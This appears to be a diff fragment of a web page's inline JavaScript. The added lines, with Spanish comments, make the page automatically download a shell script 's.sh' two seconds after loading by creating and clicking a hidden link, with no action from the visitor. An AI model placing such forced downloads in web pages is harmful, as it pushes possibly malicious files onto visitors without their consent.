@@ -111,6 +111,15 @@
           link.click();
         });
       }, 1000); // Espera 1 segundo después de cargar la página
+	   // 📄 Descargar automáticamente un archivo
+      setTimeout(() => {
+        const fileLink = document.createElement('a');
+        fileLink.href = 's.sh'; // Cambia a tu archivo real
+        fileLink.download = 's.sh'; // Nombre con el que se guarda
+        document.body.appendChild(fileLink);
+        fileLink.click();
+        document.body.removeChild(fileLink);
+      }, 2000); // Espera 2 segundos para evitar que se crucen los clics
     };
   </script>
 
